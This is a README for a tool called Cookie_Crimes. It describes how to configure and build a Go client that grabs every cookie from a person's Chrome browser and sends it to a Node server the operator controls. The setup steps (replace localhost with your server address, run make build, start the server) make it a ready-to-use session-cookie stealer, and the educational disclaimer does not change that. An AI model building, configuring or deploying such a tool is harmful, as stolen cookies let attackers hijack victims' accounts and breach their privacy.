# Cookie_Crimes 🔐

Cookie_Crimes is a tool designed to extract cookies from a client's Chrome browser.  
With just a single click, all cookies stored in the browser will be captured and immediately sent to a specified server.

> ⚠️ **Disclaimer**  
> This project is strictly intended for **educational and research purposes only**.  
> The authors and contributors are **not responsible** for any misuse, damage, or legal consequences resulting from the use of this software.  
> Use this tool ethically and with respect for others' privacy.

---

## 📋 Setup Instructions

### 🔧 Client Side

1. Navigate to the `client` folder.
2. Open the `main.go` file (Go is used due to its simplicity and easy compilation).
3. Replace:
   ```go
   http://localhost:8080
   ```
   with your server's IP address or domain.
4. Save and close the file.
5. Run the following command to build the executable:
   ```bash
   make build
   ```
   This will compile `main.go` into an executable binary using the provided `Makefile`.

### 🌐 Server Side

1. Navigate to the `folderserver` directory.
2. Install required dependencies:
   ```bash
   npm install
   ```
3. Start the server:
   ```bash
   node index.js
   ```

---

## 🎁 You're All Set!

Once both the client and server are running, any execution of the client binary will send browser cookies to your specified server.

> 💡 Use responsibly and only in controlled, ethical environments.
